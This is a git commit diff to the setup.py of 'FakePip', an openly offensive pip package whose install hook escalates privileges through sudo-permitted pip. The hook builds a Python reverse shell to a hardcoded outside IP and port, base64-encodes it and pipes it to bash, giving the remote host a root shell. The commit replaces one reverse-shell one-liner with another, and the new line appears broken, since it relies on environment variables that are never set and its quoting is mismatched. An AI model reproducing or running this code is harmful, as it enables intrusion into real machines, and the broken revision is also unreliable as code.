34adb020e5fb54bb62bee9e81818217d7422b8fd
staccat0 <49298517+staccat0@users.noreply.github.com>
2023-05-17 01:02:48 +0800

    Update setup.py

--- setup.py
+++ setup.py
@@ -9,10 +9,13 @@ class CustomInstall(install):
         install.run(self)
         LHOST = '1.117.150.194'  # change this
         LPORT = 12345
-
-        reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST, LPORT=LPORT)
+        
+        reverse_shell = 'python -c "import sys, socket, os, pty;s = socket.socket();s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))));[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)];pty.spawn("/bin/sh")"'.format(
+            RHOST=LHOST, RPORT=LPORT)
         encoded = base64.b64encode(reverse_shell)
         os.system('echo %s|base64 -d|bash' % encoded)
 
 
-setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *',url='https://github.com/staccat0/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br',license='MIT', zip_safe=False, cmdclass={'install': CustomInstall})
+setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *',
+      url='https://github.com/staccat0/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br',
+      license='MIT', zip_safe=False, cmdclass={'install': CustomInstall})
